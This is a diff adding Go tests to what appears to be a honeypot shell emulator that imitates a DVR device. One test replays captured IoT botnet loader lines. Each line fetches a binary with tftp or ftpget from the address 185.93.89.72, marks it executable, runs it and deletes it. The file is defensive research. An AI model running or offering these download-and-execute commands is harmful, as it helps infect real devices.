@@ -164,3 +164,34 @@ func TestWhileIsReserved(t *testing.T) {
 		}
 	}
 }
+
+func TestSubshellGroupsAndRedirects(t *testing.T) {
+	s := NewInterpreter("root")
+	if out, _, _ := s.Run("(echo a; echo b) > /tmp/s; cat /tmp/s"); out != "a\r\nb\r\n" {
+		t.Errorf("redirected subshell -> %q", out)
+	}
+	if out, code, _ := s.Run("(false || echo x)"); out != "x" || code != 0 {
+		t.Errorf("(false || echo x) -> (%q, %d)", out, code)
+	}
+	if out, _, _ := s.Run("(cd /tmp; export V=1); pwd; echo \"[$V]\""); out != "/root\r\n[]" {
+		t.Errorf("subshell state leaked: %q", out)
+	}
+	if out, code, _ := s.Run("(echo x"); code != 2 || !strings.Contains(out, "syntax error") {
+		t.Errorf("unclosed ( -> (%q, %d), want a syntax error", out, code)
+	}
+}
+
+// The exact tftp/ftpget loader lines seen from 15 IPs: the group's errors
+// reach the terminal, its redirect still creates the (empty) file.
+func TestDVRSubshellLoaderLines(t *testing.T) {
+	s := newDVR()
+	s.Run("cd /tmp")
+	for line, want := range map[string]string{
+		"(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t": "tftp: timeout\r\ntftp: timeout",
+		"(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f":         "ftpget: can't connect to remote host (185.93.89.72): Connection timed out\r\nftpget: can't connect to remote host (185.93.89.72): Connection timed out",
+	} {
+		if out, _, _ := s.Run(line); out != want {
+			t.Errorf("%q\n -> %q\n want %q", line, out, want)
+		}
+	}
+}
